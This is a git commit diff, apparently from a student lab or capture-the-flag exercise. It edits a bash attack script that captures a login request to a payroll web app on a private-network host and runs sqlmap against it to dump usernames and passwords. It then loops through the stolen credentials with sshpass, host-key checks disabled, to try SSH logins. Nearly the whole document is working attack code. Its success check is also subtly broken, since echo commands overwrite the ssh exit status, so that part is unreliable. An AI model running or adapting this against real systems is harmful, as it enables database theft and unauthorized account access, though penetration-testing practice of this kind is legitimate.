496a6a4c7ae822ae8339b971732721814f0a8173
Bartłomiej Matejuk <bartek.matejuk.szkola@gmail.com>
2024-04-28 14:54:13 +0200

    edit mysql.sh - loop over username password to ssh connection
    Co-authored-by: 254044 <162146517+254044@users.noreply.github.com>

--- attacks_conf/mysql.sh
+++ attacks_conf/mysql.sh
@@ -1,7 +1,31 @@
 #!/bin/bash
 
-curl -H "Content-Type: text/plain" http://192.168.100.86/payroll_app.php --trace-ascii /dev/stdout -d "user=123&password=345&s=OK" POST | head -n 12 | grep : | awk '{print $2,$3,$4}' > request.txt
-sqlmap -r request.txt --batch -D payroll -T users -C username,password --dump
+# Server IP address
+SERVER_IP="192.168.100.86"
 
-PASSWORD=help_me_obiwan
-sshpass -p $PASSWORD ssh -q leia_organa@192.168.100.86 'groups'
+#Collecting POST request
+curl -H "Content-Type: text/plain" http://$SERVER_IP/payroll_app.php --trace-ascii /dev/stdout -d "user=123&password=345&s=OK" POST | head -n 12 | grep : | awk '{print $2,$3,$4}' > request.txt
+
+#Use sqlmap with request and collect content from payroll database tables, searching for usernames and passwords
+sqlmap -r request.txt -D payroll --tables --dump -C "username, password" | grep -E '^\|\s+\w+.*?\|\s+\w+.*?\s+\|$' | tail -n +2 | awk '{print $2,$4}' > mysql-username_password.txt
+
+
+# Loop through each line in the credentials file
+while IFS=' ' read -r username password
+do
+    echo "Trying to connect as $username ..."
+
+    # Try to SSH and run the groups command, using password authentication
+    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o BatchMode=yes -l "$username" "$SERVER_IP" "groups" 2>/dev/null
+    echo "$username"
+    echo "$password"
+    # Check if the SSH connection was successful
+    if [ $? -eq 0 ]; then
+        echo "Successful login with username: $username"
+        break # Exit the loop if connection is successful
+    else
+        echo "Failed to connect with username: $username"
+    fi
+
+done < "mysql-username_password.txt"
+
